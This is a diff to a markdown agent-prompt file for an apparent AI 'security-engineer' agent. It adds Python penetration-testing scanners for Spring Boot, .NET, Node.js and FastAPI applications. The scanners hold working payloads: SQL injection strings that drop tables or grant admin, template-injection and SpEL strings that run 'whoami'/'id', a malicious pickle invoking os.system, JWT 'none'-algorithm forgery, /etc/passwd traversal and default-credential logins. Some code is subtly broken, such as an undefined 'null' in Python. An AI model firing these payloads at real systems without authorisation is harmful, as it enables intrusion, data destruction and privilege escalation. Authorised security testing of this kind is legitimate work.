@@ -1,9 +1,20 @@
 # Penetration Testing and Security Audit
 
 **Agent: security-engineer**
-**Purpose: Conduct comprehensive penetration testing and security audits to identify vulnerabilities and validate security controls**
+**Purpose: Conduct comprehensive penetration testing and security audits with technology-adaptive testing methodologies**
 
 ---
+
+## Context Analysis
+
+The security-engineer will analyze the CLAUDE.md file to determine:
+- **Technology Stack**: Target technologies (Java/Spring, .NET Core, Node.js, Python/FastAPI) for appropriate vulnerability testing techniques and exploit selection
+- **Application Architecture**: Web applications, APIs, desktop applications, or mobile apps for targeted testing methodologies
+- **Business Domain**: Industry-specific threats and compliance requirements (fintech, healthcare, ecommerce) for tailored attack scenarios
+- **Project Scale**: Infrastructure complexity and attack surface size for comprehensive testing scope and resource allocation
+- **Security Maturity**: Current security implementation level for appropriate testing depth and exploitation boundaries
+
+Based on this analysis, the security engineer will select appropriate penetration testing tools, customize attack scenarios, and focus on technology-specific vulnerabilities and misconfigurations.
 
 ## 🎯 Mission
 
@@ -718,6 +729,920 @@ class PentestReportGenerator:
         return recommendations
 ```
 
+## Technology-Adaptive Implementation
+
+### Java/Spring Boot Application Testing
+
+**Recommended Pattern:** Spring Security-focused testing with JPA injection and JWT token manipulation
+
+```python
+# spring_boot_pentest.py
+import requests
+import jwt
+import json
+from datetime import datetime, timedelta
+
+class SpringBootPentest:
+    def __init__(self, target_url):
+        self.target = target_url
+        self.session = requests.Session()
+        self.vulnerabilities = []
+    
+    def test_spring_vulnerabilities(self):
+        """Test Spring Boot specific vulnerabilities"""
+        
+        # Spring Boot Actuator exposure
+        self.test_actuator_endpoints()
+        
+        # Spring Security misconfigurations
+        self.test_spring_security_bypasses()
+        
+        # JPA/Hibernate injection
+        self.test_jpa_injection()
+        
+        # JWT token vulnerabilities
+        self.test_jwt_vulnerabilities()
+        
+        # Spring Expression Language injection
+        self.test_spel_injection()
+        
+        return self.vulnerabilities
+    
+    def test_actuator_endpoints(self):
+        """Test for exposed Spring Boot Actuator endpoints"""
+        actuator_endpoints = [
+            '/actuator', '/actuator/health', '/actuator/info',
+            '/actuator/metrics', '/actuator/env', '/actuator/configprops',
+            '/actuator/mappings', '/actuator/beans', '/actuator/trace',
+            '/actuator/dump', '/actuator/shutdown', '/actuator/flyway',
+            '/actuator/liquidbase', '/management', '/manage'
+        ]
+        
+        for endpoint in actuator_endpoints:
+            try:
+                response = self.session.get(f"{self.target}{endpoint}", timeout=10)
+                if response.status_code == 200:
+                    # Check for sensitive information exposure
+                    sensitive_keywords = [
+                        'password', 'secret', 'key', 'token', 'credential',
+                        'database.url', 'spring.datasource', 'jwt.secret'
+                    ]
+                    
+                    for keyword in sensitive_keywords:
+                        if keyword.lower() in response.text.lower():
+                            self.vulnerabilities.append({
+                                'type': 'Spring Boot Actuator Information Disclosure',
+                                'severity': 'High',
+                                'endpoint': endpoint,
+                                'evidence': f"Sensitive information '{keyword}' exposed",
+                                'impact': 'Configuration and secrets exposure'
+                            })
+                            break
+                    
+                    # Check for dangerous endpoints
+                    if endpoint.endswith('/shutdown') and 'POST' in response.headers.get('Allow', ''):
+                        self.vulnerabilities.append({
+                            'type': 'Spring Boot Actuator Remote Shutdown',
+                            'severity': 'Critical',
+                            'endpoint': endpoint,
+                            'evidence': 'Shutdown endpoint is accessible',
+                            'impact': 'Remote application shutdown possible'
+                        })
+            except Exception as e:
+                continue
+    
+    def test_jpa_injection(self):
+        """Test for JPA/JPQL injection vulnerabilities"""
+        jpa_payloads = [
+            "' OR 1=1--",
+            "'; SELECT u FROM User u WHERE u.role='ADMIN'--",
+            "' UNION SELECT password FROM User WHERE username='admin'--",
+            "'; UPDATE User SET role='ADMIN' WHERE username='victim'--"
+        ]
+        
+        # Find endpoints that likely use JPA queries
+        search_endpoints = ['/search', '/find', '/query', '/list', '/filter']
+        
+        for endpoint in search_endpoints:
+            for payload in jpa_payloads:
+                test_params = {'query': payload, 'search': payload, 'filter': payload}
+                
+                try:
+                    response = self.session.get(f"{self.target}{endpoint}", 
+                                              params=test_params, timeout=10)
+                    
+                    # Check for JPQL error messages
+                    jpql_errors = [
+                        'org.hibernate.hql.ast.QuerySyntaxException',
+                        'javax.persistence.Query',
+                        'org.hibernate.exception.SQLGrammarException',
+                        'JPA Query Exception'
+                    ]
+                    
+                    for error in jpql_errors:
+                        if error in response.text:
+                            self.vulnerabilities.append({
+                                'type': 'JPA/JPQL Injection',
+                                'severity': 'Critical',
+                                'endpoint': endpoint,
+                                'payload': payload,
+                                'evidence': f"JPQL error: {error}",
+                                'impact': 'Database access and data manipulation'
+                            })
+                            break
+                            
+                except Exception as e:
+                    continue
+    
+    def test_jwt_vulnerabilities(self):
+        """Test JWT implementation vulnerabilities"""
+        # Try to get a JWT token first
+        login_endpoints = ['/api/auth/login', '/login', '/authenticate']
+        token = None
+        
+        for endpoint in login_endpoints:
+            try:
+                # Common default credentials
+                creds = {'username': 'admin', 'password': 'admin'}
+                response = self.session.post(f"{self.target}{endpoint}", json=creds)
+                
+                if 'token' in response.text.lower():
+                    token_data = response.json()
+                    token = token_data.get('token') or token_data.get('accessToken')
+                    break
+            except:
+                continue
+        
+        if token:
+            # Test JWT vulnerabilities
+            self.test_jwt_none_algorithm(token)
+            self.test_jwt_weak_secret(token)
+            self.test_jwt_key_confusion(token)
+    
+    def test_jwt_none_algorithm(self, original_token):
+        """Test for JWT 'none' algorithm bypass"""
+        try:
+            # Decode without verification to get payload
+            decoded = jwt.decode(original_token, options={"verify_signature": False})
+            
+            # Create new token with 'none' algorithm
+            malicious_payload = decoded.copy()
+            malicious_payload['role'] = 'ADMIN'
+            malicious_payload['exp'] = int((datetime.utcnow() + timedelta(hours=1)).timestamp())
+            
+            # Create token with 'none' algorithm
+            malicious_token = jwt.encode(malicious_payload, '', algorithm='none')
+            
+            # Test with protected endpoint
+            headers = {'Authorization': f'Bearer {malicious_token}'}
+            response = self.session.get(f"{self.target}/api/admin/users", headers=headers)
+            
+            if response.status_code == 200:
+                self.vulnerabilities.append({
+                    'type': 'JWT None Algorithm Bypass',
+                    'severity': 'Critical',
+                    'evidence': 'Successfully bypassed JWT validation with none algorithm',
+                    'impact': 'Complete authentication bypass and privilege escalation'
+                })
+                
+        except Exception as e:
+            pass
+    
+    def test_spel_injection(self):
+        """Test for Spring Expression Language injection"""
+        spel_payloads = [
+            "${7*7}",
+            "#{7*7}",
+            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
+            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+            "${T(java.lang.System).getProperty('user.dir')}"
+        ]
+        
+        # Test common parameter names that might be processed by SpEL
+        param_names = ['expression', 'formula', 'template', 'message', 'text']
+        
+        for param in param_names:
+            for payload in spel_payloads:
+                try:
+                    test_data = {param: payload}
+                    response = self.session.post(f"{self.target}/api/process", 
+                                               json=test_data, timeout=10)
+                    
+                    # Check if SpEL was evaluated
+                    if payload == "${7*7}" or payload == "#{7*7}":
+                        if "49" in response.text:
+                            self.vulnerabilities.append({
+                                'type': 'Spring Expression Language Injection',
+                                'severity': 'Critical',
+                                'parameter': param,
+                                'payload': payload,
+                                'evidence': 'Mathematical expression evaluated: 7*7=49',
+                                'impact': 'Remote code execution possible'
+                            })
+                    
+                    # Check for command execution
+                    elif 'whoami' in payload.lower() or 'id' in payload:
+                        if any(indicator in response.text.lower() 
+                              for indicator in ['root', 'uid=', 'gid=', 'administrator']):
+                            self.vulnerabilities.append({
+                                'type': 'Spring Expression Language RCE',
+                                'severity': 'Critical',
+                                'parameter': param,
+                                'payload': payload,
+                                'evidence': 'Command execution successful',
+                                'impact': 'Remote code execution achieved'
+                            })
+                            
+                except Exception as e:
+                    continue
+
+# Database-specific testing for Spring Boot
+def test_spring_data_jpa_vulnerabilities(target_url):
+    """Test Spring Data JPA specific vulnerabilities"""
+    
+    # Test for repository exposure via Spring Data REST
+    data_rest_endpoints = [
+        '/api/users', '/api/customers', '/api/orders',
+        '/api/products', '/api/accounts', '/users',
+        '/customers', '/orders', '/products'
+    ]
+    
+    vulnerabilities = []
+    session = requests.Session()
+    
+    for endpoint in data_rest_endpoints:
+        try:
+            # Test for unauthenticated access
+            response = session.get(f"{target_url}{endpoint}")
+            
+            if response.status_code == 200 and 'application/hal+json' in response.headers.get('content-type', ''):
+                data = response.json()
+                
+                # Check if sensitive data is exposed
+                if '_embedded' in data:
+                    vulnerabilities.append({
+                        'type': 'Spring Data REST Exposure',
+                        'severity': 'High',
+                        'endpoint': endpoint,
+                        'evidence': 'Repository data exposed via REST without authentication',
+                        'impact': 'Unauthorized data access'
+                    })
+                
+                # Test for write operations
+                test_data = {'name': 'test', 'value': 'pentest'}
+                post_response = session.post(f"{target_url}{endpoint}", json=test_data)
+                
+                if post_response.status_code in [200, 201]:
+                    vulnerabilities.append({
+                        'type': 'Spring Data REST Unauthorized Write',
+                        'severity': 'Critical',
+                        'endpoint': endpoint,
+                        'evidence': 'Successfully created data without authentication',
+                        'impact': 'Unauthorized data manipulation'
+                    })
+                    
+        except Exception as e:
+            continue
+    
+    return vulnerabilities
+```
+
+### .NET Core Application Testing
+
+**Recommended Pattern:** ASP.NET Core security testing with Entity Framework and Identity vulnerabilities
+
+```python
+# dotnet_core_pentest.py
+import requests
+import base64
+import json
+from urllib.parse import quote
+
+class DotNetCorePentest:
+    def __init__(self, target_url):
+        self.target = target_url
+        self.session = requests.Session()
+        self.vulnerabilities = []
+    
+    def test_dotnet_vulnerabilities(self):
+        """Test .NET Core specific vulnerabilities"""
+        
+        # ASP.NET Core configuration exposure
+        self.test_configuration_exposure()
+        
+        # Entity Framework injection
+        self.test_entity_framework_injection()
+        
+        # ASP.NET Core Identity vulnerabilities
+        self.test_identity_vulnerabilities()
+        
+        # Model binding vulnerabilities
+        self.test_model_binding_attacks()
+        
+        # ViewState manipulation
+        self.test_viewstate_attacks()
+        
+        return self.vulnerabilities
+    
+    def test_configuration_exposure(self):
+        """Test for exposed configuration endpoints"""
+        config_endpoints = [
+            '/api/configuration', '/config', '/appsettings',
+            '/.well-known/configuration', '/health', '/info',
+            '/metrics', '/env'
+        ]
+        
+        for endpoint in config_endpoints:
+            try:
+                response = self.session.get(f"{self.target}{endpoint}", timeout=10)
+                
+                if response.status_code == 200:
+                    # Check for sensitive configuration data
+                    sensitive_keys = [
+                        'connectionstring', 'password', 'secret', 'key',
+                        'jwt:secret', 'database', 'apikey', 'token'
+                    ]
+                    
+                    response_lower = response.text.lower()
+                    for key in sensitive_keys:
+                        if key in response_lower:
+                            self.vulnerabilities.append({
+                                'type': '.NET Configuration Exposure',
+                                'severity': 'High',
+                                'endpoint': endpoint,
+                                'evidence': f"Sensitive configuration '{key}' exposed",
+                                'impact': 'Credentials and secrets disclosure'
+                            })
+                            break
+                            
+            except Exception as e:
+                continue
+    
+    def test_entity_framework_injection(self):
+        """Test for Entity Framework LINQ injection"""
+        ef_payloads = [
+            "'; DROP TABLE Users--",
+            "' OR 1=1--",
+            "\'; SELECT * FROM Users WHERE Role=\'Admin\'--",
+            "' UNION SELECT Password FROM Users WHERE Username='admin'--"
+        ]
+        
+        # Common EF endpoint patterns
+        ef_endpoints = ['/api/search', '/api/filter', '/api/query', '/api/find']
+        
+        for endpoint in ef_endpoints:
+            for payload in ef_payloads:
+                test_params = {
+                    'query': payload,
+                    'search': payload,
+                    'filter': payload,
+                    'where': payload
+                }
+                
+                try:
+                    response = self.session.get(f"{self.target}{endpoint}", 
+                                              params=test_params, timeout=10)
+                    
+                    # Check for Entity Framework error messages
+                    ef_errors = [
+                        'System.Data.SqlClient.SqlException',
+                        'Microsoft.EntityFrameworkCore',
+                        'EntityFramework.Core.DbUpdateException',
+                        'System.InvalidOperationException: The LINQ expression'
+                    ]
+                    
+                    for error in ef_errors:
+                        if error in response.text:
+                            self.vulnerabilities.append({
+                                'type': 'Entity Framework Injection',
+                                'severity': 'Critical',
+                                'endpoint': endpoint,
+                                'payload': payload,
+                                'evidence': f"EF error: {error}",
+                                'impact': 'Database access and manipulation'
+                            })
+                            break
+                            
+                except Exception as e:
+                    continue
+    
+    def test_model_binding_attacks(self):
+        """Test for model binding vulnerabilities"""
+        # Test mass assignment
+        mass_assignment_payloads = [
+            {'IsAdmin': True, 'Role': 'Administrator'},
+            {'Password': 'hacked', 'IsActive': True},
+            {'Permissions': ['Admin', 'SuperUser']},
+            {'UserId': 1, 'Username': 'admin'}
+        ]
+        
+        # Common endpoints that accept model binding
+        model_endpoints = ['/api/users', '/api/profile', '/api/account/update']
+        
+        for endpoint in model_endpoints:
+            for payload in mass_assignment_payloads:
+                try:
+                    # Test PUT request
+                    response = self.session.put(f"{self.target}{endpoint}/1", 
+                                               json=payload, timeout=10)
+                    
+                    if response.status_code == 200:
+                        # Check if dangerous properties were accepted
+                        if any(key in str(payload.keys()).lower() 
+                              for key in ['admin', 'role', 'permission']):
+                            self.vulnerabilities.append({
+                                'type': 'Mass Assignment Vulnerability',
+                                'severity': 'High',
+                                'endpoint': endpoint,
+                                'payload': payload,
+                                'evidence': 'Dangerous properties accepted in model binding',
+                                'impact': 'Privilege escalation and unauthorized access'
+                            })
+                    
+                    # Test POST request
+                    post_response = self.session.post(f"{self.target}{endpoint}", 
+                                                     json=payload, timeout=10)
+                    
+                    if post_response.status_code in [200, 201]:
+                        self.vulnerabilities.append({
+                            'type': 'Mass Assignment in Create Operation',
+                            'severity': 'High',
+                            'endpoint': endpoint,
+                            'payload': payload,
+                            'evidence': 'Created object with dangerous properties',
+                            'impact': 'Unauthorized account creation with elevated privileges'
+                        })
+                        
+                except Exception as e:
+                    continue
+    
+    def test_identity_vulnerabilities(self):
+        """Test ASP.NET Core Identity vulnerabilities"""
+        
+        # Test for default admin accounts
+        default_creds = [
+            {'Email': 'admin@admin.com', 'Password': 'Admin123!'},
+            {'Email': 'administrator@test.com', 'Password': 'Password123!'},
+            {'Email': 'admin@localhost', 'Password': 'admin'},
+            {'Username': 'admin', 'Password': 'admin'}
+        ]
+        
+        login_endpoints = ['/Account/Login', '/api/auth/login', '/login']
+        
+        for endpoint in login_endpoints:
+            for creds in default_creds:
+                try:
+                    response = self.session.post(f"{self.target}{endpoint}", 
+                                                data=creds, timeout=10)
+                    
+                    # Check for successful authentication
+                    success_indicators = [
+                        'dashboard', 'welcome', 'logout', 'profile',
+                        'authentication successful', 'login successful'
+                    ]
+                    
+                    for indicator in success_indicators:
+                        if indicator.lower() in response.text.lower():
+                            self.vulnerabilities.append({
+                                'type': 'Default Credentials',
+                                'severity': 'Critical',
+                                'endpoint': endpoint,
+                                'credentials': creds,
+                                'evidence': f"Successfully authenticated with: {creds}",
+                                'impact': 'Administrative access with default credentials'
+                            })
+                            break
+                            
+                except Exception as e:
+                    continue
+```
+
+### Node.js/Express Application Testing
+
+**Recommended Pattern:** JavaScript-specific vulnerabilities with NoSQL injection and prototype pollution
+
+```python
+# nodejs_pentest.py
+import requests
+import json
+
+class NodeJSPentest:
+    def __init__(self, target_url):
+        self.target = target_url
+        self.session = requests.Session()
+        self.vulnerabilities = []
+    
+    def test_nodejs_vulnerabilities(self):
+        """Test Node.js/Express specific vulnerabilities"""
+        
+        # NoSQL injection (MongoDB)
+        self.test_nosql_injection()
+        
+        # Prototype pollution
+        self.test_prototype_pollution()
+        
+        # Express.js vulnerabilities
+        self.test_express_vulnerabilities()
+        
+        # JWT vulnerabilities
+        self.test_nodejs_jwt_issues()
+        
+        # Package vulnerabilities
+        self.test_known_package_vulns()
+        
+        return self.vulnerabilities
+    
+    def test_nosql_injection(self):
+        """Test for NoSQL injection vulnerabilities"""
+        nosql_payloads = [
+            {"$ne": null},
+            {"$gt": ""},
+            {"$where": "this.username == this.password"},
+            {"$regex": ".*"},
+            {"username": {"$ne": null}, "password": {"$ne": null}},
+            {"$or": [{"username": "admin"}, {"username": "administrator"}]}
+        ]
+        
+        # Test authentication bypass
+        auth_endpoints = ['/api/login', '/auth', '/login']
+        
+        for endpoint in auth_endpoints:
+            for payload in nosql_payloads:
+                test_data = {
+                    "username": payload,
+                    "password": payload
+                }
+                
+                try:
+                    response = self.session.post(f"{self.target}{endpoint}", 
+                                               json=test_data, timeout=10)
+                    
+                    # Check for successful authentication
+                    if response.status_code == 200:
+                        response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
+                        
+                        if any(key in response_data for key in ['token', 'success', 'authenticated']):
+                            self.vulnerabilities.append({
+                                'type': 'NoSQL Injection Authentication Bypass',
+                                'severity': 'Critical',
+                                'endpoint': endpoint,
+                                'payload': payload,
+                                'evidence': 'Successfully bypassed authentication',
+                                'impact': 'Complete authentication bypass'
+                            })
+                            
+                except Exception as e:
+                    continue
+        
+        # Test data extraction
+        search_endpoints = ['/api/search', '/api/users', '/api/find']
+        
+        for endpoint in search_endpoints:
+            extraction_payloads = [
+                {"$where": "return true"},
+                {"$regex": "^.*"},
+                {"$exists": True}
+            ]
+            
+            for payload in extraction_payloads:
+                try:
+                    response = self.session.get(f"{self.target}{endpoint}", 
+                                               params={'query': json.dumps(payload)}, 
+                                               timeout=10)
+                    
+                    if response.status_code == 200:
+                        try:
+                            data = response.json()
+                            if isinstance(data, list) and len(data) > 0:
+                                self.vulnerabilities.append({
+                                    'type': 'NoSQL Injection Data Extraction',
+                                    'severity': 'High',
+                                    'endpoint': endpoint,
+                                    'payload': payload,
+                                    'evidence': f"Extracted {len(data)} records",
+                                    'impact': 'Unauthorized data access'
+                                })
+                        except:
+                            pass
+                            
+                except Exception as e:
+                    continue
+    
+    def test_prototype_pollution(self):
+        """Test for prototype pollution vulnerabilities"""
+        pollution_payloads = [
+            {"__proto__": {"admin": True}},
+            {"constructor": {"prototype": {"admin": True}}},
+            {"__proto__.admin": True},
+            {"constructor.prototype.admin": True}
+        ]
+        
+        # Test various endpoints that might process JSON
+        test_endpoints = ['/api/config', '/api/settings', '/api/profile', '/api/update']
+        
+        for endpoint in test_endpoints:
+            for payload in pollution_payloads:
+                try:
+                    # Send pollution payload
+                    response = self.session.post(f"{self.target}{endpoint}", 
+                                                json=payload, timeout=10)
+                    
+                    # Test if pollution was successful by checking a different endpoint
+                    test_response = self.session.get(f"{self.target}/api/user", timeout=10)
+                    
+                    if test_response.status_code == 200:
+                        try:
+                            test_data = test_response.json()
+                            if test_data.get('admin') == True:
+                                self.vulnerabilities.append({
+                                    'type': 'Prototype Pollution',
+                                    'severity': 'High',
+                                    'endpoint': endpoint,
+                                    'payload': payload,
+                                    'evidence': 'Successfully polluted prototype with admin property',
+                                    'impact': 'Privilege escalation and application logic bypass'
+                                })
+                        except:
+                            pass
+                            
+                except Exception as e:
+                    continue
+    
+    def test_express_vulnerabilities(self):
+        """Test Express.js specific vulnerabilities"""
+        
+        # Test for path traversal
+        traversal_payloads = [
+            '../../../etc/passwd',
+            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+            '....//....//....//etc/passwd',
+            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+        ]
+        
+        file_endpoints = ['/api/file', '/download', '/static', '/public']
+        
+        for endpoint in file_endpoints:
+            for payload in traversal_payloads:
+                try:
+                    response = self.session.get(f"{self.target}{endpoint}", 
+                                               params={'file': payload, 'path': payload}, 
+                                               timeout=10)
+                    
+                    # Check for file contents
+                    if 'root:' in response.text or 'localhost' in response.text:
+                        self.vulnerabilities.append({
+                            'type': 'Path Traversal',
+                            'severity': 'High',
+                            'endpoint': endpoint,
+                            'payload': payload,
+                            'evidence': 'Successfully read system files',
+                            'impact': 'Unauthorized file system access'
+                        })
+                        
+                except Exception as e:
+                    continue
+        
+        # Test for SSTI (Server-Side Template Injection)
+        ssti_payloads = [
+            '{{7*7}}',
+            '${7*7}',
+            '<%= 7*7 %>',
+            '{{config}}',
+            '{{constructor.constructor("return process")()}}'
+        ]
+        
+        template_params = ['template', 'message', 'content', 'text']
+        
+        for param in template_params:
+            for payload in ssti_payloads:
+                try:
+                    test_data = {param: payload}
+                    response = self.session.post(f"{self.target}/api/render", 
+                                                json=test_data, timeout=10)
+                    
+                    # Check if template was evaluated
+                    if payload in ['{{7*7}}', '${7*7}', '<%= 7*7 %>']:
+                        if '49' in response.text:
+                            self.vulnerabilities.append({
+                                'type': 'Server-Side Template Injection',
+                                'severity': 'Critical',
+                                'parameter': param,
+                                'payload': payload,
+                                'evidence': 'Mathematical expression evaluated: 7*7=49',
+                                'impact': 'Remote code execution possible'
+                            })
+                            
+                except Exception as e:
+                    continue
+```
+
+### Python/FastAPI Application Testing
+
+**Recommended Pattern:** Python-specific testing with SQLAlchemy injection and pickle deserialization
+
+```python
+# python_fastapi_pentest.py
+import requests
+import pickle
+import base64
+import json
+
+class PythonFastAPIPentest:
+    def __init__(self, target_url):
+        self.target = target_url
+        self.session = requests.Session()
+        self.vulnerabilities = []
+    
+    def test_python_vulnerabilities(self):
+        """Test Python/FastAPI specific vulnerabilities"""
+        
+        # SQLAlchemy injection
+        self.test_sqlalchemy_injection()
+        
+        # Python pickle deserialization
+        self.test_pickle_deserialization()
+        
+        # FastAPI automatic docs exposure
+        self.test_fastapi_docs_exposure()
+        
+        # Python template injection
+        self.test_python_ssti()
+        
+        # Pydantic model bypasses
+        self.test_pydantic_bypasses()
+        
+        return self.vulnerabilities
+    
+    def test_sqlalchemy_injection(self):
+        """Test for SQLAlchemy ORM injection"""
+        sqlalchemy_payloads = [
+            "' OR 1=1--",
+            "'; DROP TABLE users--",
+            "' UNION SELECT password FROM users WHERE username='admin'--",
+            "'; UPDATE users SET role='admin' WHERE username='victim'--"
+        ]
+        
+        # Common SQLAlchemy endpoint patterns
+        sql_endpoints = ['/api/search', '/api/filter', '/api/query']
+        
+        for endpoint in sql_endpoints:
+            for payload in sqlalchemy_payloads:
+                test_params = {'q': payload, 'search': payload, 'filter': payload}
+                
+                try:
+                    response = self.session.get(f"{self.target}{endpoint}", 
+                                              params=test_params, timeout=10)
+                    
+                    # Check for SQLAlchemy error messages
+                    sqlalchemy_errors = [
+                        'sqlalchemy.exc.ProgrammingError',
+                        'sqlalchemy.exc.IntegrityError',
+                        'psycopg2.errors.SyntaxError',
+                        'sqlite3.OperationalError'
+                    ]
+                    
+                    for error in sqlalchemy_errors:
+                        if error in response.text:
+                            self.vulnerabilities.append({
+                                'type': 'SQLAlchemy Injection',
+                                'severity': 'Critical',
+                                'endpoint': endpoint,
+                                'payload': payload,
+                                'evidence': f"SQLAlchemy error: {error}",
+                                'impact': 'Database access and manipulation'
+                            })
+                            break
+                            
+                except Exception as e:
+                    continue
+    
+    def test_pickle_deserialization(self):
+        """Test for unsafe pickle deserialization"""
+        
+        # Create malicious pickle payload
+        class MaliciousPayload:
+            def __reduce__(self):
+                import os
+                return (os.system, ('echo "PICKLE_RCE_TEST"',))
+        
+        malicious_pickle = base64.b64encode(pickle.dumps(MaliciousPayload())).decode()
+        
+        # Test endpoints that might deserialize data
+        pickle_endpoints = ['/api/deserialize', '/api/load', '/api/import', '/api/restore']
+        
+        for endpoint in pickle_endpoints:
+            test_data = {
+                'data': malicious_pickle,
+                'pickle_data': malicious_pickle,
+                'serialized': malicious_pickle
+            }
+            
+            try:
+                response = self.session.post(f"{self.target}{endpoint}", 
+                                           json=test_data, timeout=10)
+                
+                # Check if command was executed
+                if 'PICKLE_RCE_TEST' in response.text:
+                    self.vulnerabilities.append({
+                        'type': 'Unsafe Pickle Deserialization',
+                        'severity': 'Critical',
+                        'endpoint': endpoint,
+                        'evidence': 'Successfully executed command via pickle',
+                        'impact': 'Remote code execution'
+                    })
+                    
+            except Exception as e:
+                continue
+    
+    def test_fastapi_docs_exposure(self):
+        """Test for FastAPI automatic documentation exposure"""
+        docs_endpoints = ['/docs', '/redoc', '/openapi.json']
+        
+        for endpoint in docs_endpoints:
+            try:
+                response = self.session.get(f"{self.target}{endpoint}", timeout=10)
+                
+                if response.status_code == 200:
+                    # Check for sensitive information in API docs
+                    if endpoint == '/openapi.json':
+                        try:
+                            openapi_spec = response.json()
+                            
+                            # Look for sensitive endpoints
+                            paths = openapi_spec.get('paths', {})
+                            sensitive_paths = [path for path in paths.keys() 
+                                             if any(keyword in path.lower() 
+                                                   for keyword in ['admin', 'secret', 'internal', 'debug'])]
+                            
+                            if sensitive_paths:
+                                self.vulnerabilities.append({
+                                    'type': 'FastAPI Sensitive Endpoints Exposure',
+                                    'severity': 'Medium',
+                                    'endpoint': endpoint,
+                                    'evidence': f"Sensitive endpoints exposed: {sensitive_paths}",
+                                    'impact': 'Information disclosure of internal APIs'
+                                })
+                        except:
+                            pass
+                    
+                    else:
+                        self.vulnerabilities.append({
+                            'type': 'FastAPI Documentation Exposure',
+                            'severity': 'Low',
+                            'endpoint': endpoint,
+                            'evidence': 'API documentation publicly accessible',
+                            'impact': 'API structure and endpoint disclosure'
+                        })
+                        
+            except Exception as e:
+                continue
+    
+    def test_python_ssti(self):
+        """Test for Python Server-Side Template Injection"""
+        ssti_payloads = [
+            '{{7*7}}',
+            '{{config}}',
+            "{{''.__class__.__mro__[1].__subclasses__()}}",
+            '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
+            '{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=="catch_warnings"%}{{c.__init__.__globals__["__builtins__"]["eval"]("__import__(\"os\").system(\"whoami\")")}}{%endif%}{%endfor%}'
+        ]
+        
+        template_params = ['template', 'message', 'content', 'text', 'body']
+        
+        for param in template_params:
+            for payload in ssti_payloads:
+                try:
+                    test_data = {param: payload}
+                    response = self.session.post(f"{self.target}/api/render", 
+                                                json=test_data, timeout=10)
+                    
+                    # Check if template was evaluated
+                    if payload == '{{7*7}}':
+                        if '49' in response.text:
+                            self.vulnerabilities.append({
+                                'type': 'Python Server-Side Template Injection',
+                                'severity': 'Critical',
+                                'parameter': param,
+                                'payload': payload,
+                                'evidence': 'Mathematical expression evaluated: 7*7=49',
+                                'impact': 'Remote code execution possible'
+                            })
+                    
+                    # Check for config exposure
+                    elif payload == '{{config}}' and 'SECRET_KEY' in response.text:
+                        self.vulnerabilities.append({
+                            'type': 'Python Configuration Exposure via SSTI',
+                            'severity': 'High',
+                            'parameter': param,
+                            'payload': payload,
+                            'evidence': 'Application configuration exposed',
+                            'impact': 'Sensitive configuration disclosure'
+                        })
+                        
+                except Exception as e:
+                    continue
+```
+
 ## 📊 Compliance and Audit Integration
 
 ### Security Audit Checklist
@@ -769,6 +1694,79 @@ compliance_audit_checklist:
 **With reviewer:** Security findings validation and remediation prioritization
 **With qa-engineer:** Security testing integration and automation
 **With business-analyst:** Business impact assessment and risk communication
+
+### Generic/Fallback Implementation
+
+For unsupported technologies, provide generic penetration testing patterns:
+
+```yaml
+# Generic Penetration Testing Configuration
+penetration_testing:
+  approach: "owasp_methodology"  # or "nist_sp_800_115", "ptes", "osstmm"
+  
+  reconnaissance_techniques:
+    - "passive_information_gathering"
+    - "dns_enumeration_and_subdomain_discovery"
+    - "certificate_transparency_analysis"
+    - "social_media_and_osint_collection"
+    - "technology_stack_fingerprinting"
+    
+  vulnerability_assessment:
+    - "network_service_scanning_and_enumeration"
+    - "web_application_security_testing"
+    - "database_security_assessment"
+    - "authentication_and_session_management_testing"
+    - "input_validation_and_injection_testing"
+    
+  exploitation_techniques:
+    - "automated_vulnerability_exploitation"
+    - "manual_exploitation_verification"
+    - "privilege_escalation_testing"
+    - "lateral_movement_assessment"
+    - "data_exfiltration_simulation"
+    
+  reporting_standards:
+    - "executive_summary_with_risk_assessment"
+    - "detailed_technical_findings_documentation"
+    - "proof_of_concept_evidence_collection"
+    - "remediation_recommendations_prioritized"
+    - "compliance_mapping_to_frameworks"
+```
+
+## Implementation Strategy
+
+### 1. Technology Detection
+
+Analyze CLAUDE.md configuration to determine:
+- **Application Technology** from primary_language for appropriate vulnerability testing tools and techniques
+- **Database Technology** to select proper injection testing methods and database-specific exploits
+- **Framework Patterns** for technology-specific vulnerability classes and security misconfigurations
+- **Business Domain** for compliance-focused testing and industry-specific threat scenarios
+
+### 2. Testing Methodology Selection
+
+Select penetration testing approaches based on detected requirements:
+- **Web Applications**: OWASP testing methodology with framework-specific vulnerability classes
+- **API Testing**: Technology-appropriate API security testing with authentication bypass techniques
+- **Database Security**: Database-specific injection testing and access control validation
+- **Infrastructure**: Network service testing and system-level exploitation techniques
+
+### 3. Vulnerability Exploitation Strategy
+
+Apply technology-specific exploitation techniques:
+- **Framework Exploits**: Technology-appropriate exploit modules and proof-of-concept development
+- **Business Logic Testing**: Domain-specific attack scenarios and privilege escalation paths
+- **Compliance Testing**: Regulatory framework validation and gap assessment
+- **Custom Payload Development**: Technology-specific exploit payloads and attack vectors
+
+### 4. Success Criteria
+
+Penetration testing validation checklist:
+- **Technology Coverage**: All identified technologies tested with appropriate tools and techniques
+- **Vulnerability Classification**: Findings properly categorized with technology-specific impact assessment
+- **Exploit Verification**: Successful exploitation demonstrated with proof-of-concept evidence
+- **Risk Assessment**: Business impact evaluated based on domain-specific threat landscape
+- **Remediation Guidance**: Technology-appropriate fix recommendations and implementation guidance
 
 ---
 *Comprehensive penetration testing validates security controls and identifies vulnerabilities before attackers can exploit them, ensuring robust defense against real-world threats.*
